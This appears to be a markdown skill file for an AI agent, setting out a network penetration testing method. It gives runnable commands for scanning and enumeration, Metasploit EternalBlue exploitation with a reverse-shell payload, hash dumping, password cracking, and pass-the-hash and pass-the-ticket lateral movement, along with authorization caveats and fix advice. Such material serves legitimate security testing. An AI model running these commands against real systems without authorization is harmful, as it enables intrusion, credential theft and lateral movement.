---
name: network-penetration-testing
description: Professional methodology and practical checks for network penetration testing.
version: 1.0.0
---

# Network Penetration Testing

## Overview

Network penetration testing evaluates the security of network infrastructure. This skill provides methods, tools, and best practices for network penetration testing.

## Test Scope

### 1. Information gathering

**Check items:**
- Network topology
- Host discovery
- Port scanning
- Service identification

### 2. Vulnerability scanning

**Check items:**
- System vulnerabilities
- Service vulnerabilities
- Configuration mistakes
- Weak passwords

### 3. Exploitation

**Check items:**
- Remote code execution
- Privilege escalation
- Lateral movement
- Persistence

## Information Gathering

### Network scanning

**Use Nmap:**
```bash
# Host discovery
nmap -sn 192.168.1.0/24

# Port scanning
nmap -sS -p- 192.168.1.100

# Service identification
nmap -sV -sC 192.168.1.100

# Operating system identification
nmap -O 192.168.1.100

# Complete scan
nmap -sS -sV -sC -O -p- 192.168.1.100
```

**Use Masscan:**
```bash
# Fast port scan
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

### Service enumeration

**SMB enumeration:**
```bash
# Enumerate SMB shares
smbclient -L //192.168.1.100 -N

# Enumerate SMB users
enum4linux -U 192.168.1.100

# Use Nmap scripts
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
```

**RPC enumeration:**
```bash
# Enumerate RPC services
rpcclient -U "" -N 192.168.1.100

# Use Nmap scripts
nmap --script rpc-enum 192.168.1.100
```

**SNMP enumeration:**
```bash
# SNMP scan
snmpwalk -v2c -c public 192.168.1.100

# Use onesixtyone
onesixtyone -c wordlist.txt 192.168.1.0/24
```

## Vulnerability Scanning

### Use Nessus

```bash
# Start Nessus
# Access the web interface
# Create a scan task
# Analyze scan results
```

### Use OpenVAS

```bash
# Start OpenVAS
gvm-setup

# Access the web interface
# Create a scan task
# Analyze scan results
```

### Use Nmap scripts

```bash
# Vulnerability scan
nmap --script vuln 192.168.1.100

# Specific vulnerability scan
nmap --script smb-vuln-ms17-010 192.168.1.100

# All scripts
nmap --script all 192.168.1.100
```

## Exploitation

### Metasploit

**Basic usage:**
```bash
# Start Metasploit
msfconsole

# Search for a vulnerability
search ms17-010

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# Set parameters
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444

# Execute
exploit
```

**Post-exploitation:**
```bash
# Get system information
sysinfo

# Attempt privilege escalation
getsystem

# Migrate process
migrate <pid>

# Dump hashes
hashdump

# Gather password material
run post/windows/gather/smart_hashdump
```

### Common exploit examples

**EternalBlue:**
```bash
# Use Metasploit
use exploit/windows/smb/ms17_010_eternalblue

# Use a standalone tool
python eternalblue.py 192.168.1.100
```

**BlueKeep:**
```bash
# Use Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**SMBGhost:**
```bash
# Use a standalone tool
python smbghost.py 192.168.1.100
```

## Lateral Movement

### Password cracking

**Use Hashcat:**
```bash
# Crack NTLM hashes
hashcat -m 1000 hashes.txt wordlist.txt

# Crack LM hashes
hashcat -m 3000 hashes.txt wordlist.txt

# Use rules
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
```

**Use John:**
```bash
# Crack hashes
john hashes.txt

# Use a dictionary
john --wordlist=wordlist.txt hashes.txt

# Use rules
john --wordlist=wordlist.txt --rules hashes.txt
```

### Pass-the-Hash

**Use Impacket:**
```bash
# SMB Pass-the-Hash
python smbexec.py -hashes :<hash> domain/user@target

# WMI Pass-the-Hash
python wmiexec.py -hashes :<hash> domain/user@target

# RDP Pass-the-Hash
xfreerdp /u:user /pth:<hash> /v:target
```

### Pass-the-Ticket

**Use Mimikatz:**
```bash
# Extract tickets
sekurlsa::tickets /export

# Inject a ticket
kerberos::ptt ticket.kirbi
```

**Use Rubeus:**
```bash
# Request a ticket
Rubeus.exe asktgt /user:user /domain:domain /rc4:hash

# Inject a ticket
Rubeus.exe ptt /ticket:ticket.kirbi
```

## Tool Usage

### Nmap

```bash
# Complete scan
nmap -sS -sV -sC -O -p- -T4 target

# Stealth scan
nmap -sS -T2 -f -D RND:10 target

# UDP scan
nmap -sU -p- target
```

### Metasploit

```bash
# Start the framework
msfconsole

# Initialize database
msfdb init

# Import scan results
db_import nmap.xml

# View hosts
hosts

# View services
services
```

### Burp Suite

**Network scanning:**
1. Configure a proxy.
2. Browse the target network.
3. Analyze traffic.
4. Run active scanning.

## Test Checklist

### Information gathering
- [ ] Discover network topology
- [ ] Discover hosts
- [ ] Scan ports
- [ ] Identify services
- [ ] Identify operating systems

### Vulnerability scanning
- [ ] Scan system vulnerabilities
- [ ] Scan service vulnerabilities
- [ ] Check configuration mistakes
- [ ] Check weak passwords

### Exploitation
- [ ] Remote code execution
- [ ] Privilege escalation
- [ ] Lateral movement
- [ ] Persistence

## Common Security Issues

### 1. Unpatched systems

**Issue:**
- Systems are not updated promptly.
- Known vulnerabilities exist.
- Patch management is inadequate.

**Fix:**
- Install patches promptly.
- Establish a patch management process.
- Perform regular security updates.

### 2. Weak passwords

**Issue:**
- Default passwords
- Simple passwords
- Password reuse

**Fix:**
- Implement a strong password policy.
- Enable multi-factor authentication.
- Rotate passwords regularly.

### 3. Open ports

**Issue:**
- Unnecessary ports are open.
- Services are exposed.
- Firewall configuration is wrong.

**Fix:**
- Close unnecessary ports.
- Implement firewall rules.
- Use VPN access.

### 4. Configuration mistakes

**Issue:**
- Default configuration
- Excessive permissions
- Improper service configuration

**Fix:**
- Use secure configuration baselines.
- Apply the principle of least privilege.
- Review configuration regularly.

## Best Practices

### 1. Information gathering

- Scan comprehensively.
- Validate with multiple tools.
- Record findings.
- Analyze results.

### 2. Exploitation

- Test only with authorization.
- Minimize impact.
- Record operations.
- Clean up promptly.

### 3. Report writing

- Record details.
- Rate risk.
- Provide remediation advice.
- Provide verification steps.

## Notes

- Test only in authorized environments.
- Avoid impacting production systems.
- Follow applicable laws and regulations.
- Protect test data.
